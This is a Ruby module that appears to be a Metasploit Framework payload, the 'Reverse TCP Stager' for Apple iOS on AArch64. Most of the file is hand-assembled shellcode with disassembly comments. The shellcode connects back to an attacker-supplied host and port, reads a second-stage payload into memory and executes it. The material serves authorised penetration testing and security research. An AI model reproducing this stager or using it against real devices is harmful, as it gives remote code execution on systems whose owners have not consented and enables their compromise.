##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'

module MetasploitModule

  CachedSize = 212

  include Msf::Payload::Stager

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager',
      'Description'   => 'Connect back to the attacker',
      'License'       => MSF_LICENSE,
      'Platform'      => 'apple_ios',
      'Arch'          => ARCH_AARCH64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 182, 'n'    ],
              'LHOST' => [ 184, 'ADDR' ],
            },
          'Payload' =>
          [
            # Generated from external/source/shellcode/linux/apple_ios/stager_sock_reverse.s
            0xd2800040,          #  mov	x0, #0x2                   	// #2
            0xd2800021,          #  mov	x1, #0x1                   	// #1
            0xd2800002,          #  mov	x2, #0x0                   	// #0
            0xd2800c30,          #  mov	x16, #0x61                  	// #97
            0xd4000001,          #  svc	#0x0
            0xaa0003ec,          #  mov	x12, x0
            0x100004e1,          #  adr	x1, b4 <sockaddr>
            0xd2800202,          #  mov	x2, #0x10                  	// #16
            0xd2800c50,          #  mov	x16, #0x62                  	// #98
            0xd4000001,          #  svc	#0x0
            0x35000400,          #  cbnz	w0, a8 <failed>
            0xaa0c03e0,          #  mov	x0, x12
            0xd10043ff,          #  sub	sp, sp, #0x10
            0x910003e1,          #  mov	x1, sp
            0xd2800082,          #  mov	x2, #0x4                   	// #4
            0xd2800070,          #  mov	x16, #0x3                   	// #3
            0xd4000001,          #  svc	#0x0
            0xb100041f,          #  cmn	x0, #0x1
            0x54000300,          #  b.eq	a8 <failed>
            0xb94003e2,          #  ldr	w2, [sp]
            0xd34cfc42,          #  lsr	x2, x2, #12
            0x91000442,          #  add	x2, x2, #0x1
            0xd374cc42,          #  lsl	x2, x2, #12
            0x10000300,          #  adr	x0, bc <next_stage>
            0xd34cfc00,          #  lsr	x0, x0, #12
            0x91000400,          #  add	x0, x0, #0x1
            0xd374cc00,          #  lsl	x0, x0, #12
            0xb94003e4,          #  ldr	w4, [sp]
            0xf90003e0,          #  str	x0, [sp]
            0xaa0003e3,          #  mov	x3, x0
            0xaa0c03e0,          #  mov	x0, x12
            0xaa0303e1,          #  mov	x1, x3
            0xaa0403e2,          #  mov	x2, x4
            0xd2800070,          #  mov	x16, #0x3                   	// #3
            0xd4000001,          #  svc	#0x0
            0xb100041f,          #  cmn	x0, #0x1
            0x540000c0,          #  b.eq	a8 <failed>
            0x8b000063,          #  add	x3, x3, x0
            0xeb000084,          #  subs	x4, x4, x0
            0x54fffee1,          #  b.ne	78 <read_loop>
            0xf94003e0,          #  ldr	x0, [sp]
            0xd63f0000,          #  blr	x0
            0xd2800000,          #  mov	x0, #0x0                   	// #0
            0xd2800030,          #  mov	x16, #0x1                   	// #1
            0xd4000001,          #  svc	#0x0
            0x5c110002,          #  .word	0x5c110002
            0x0100007f,          #  .word	0x0100007f
          ].pack("V*")
        }
      ))
  end

end
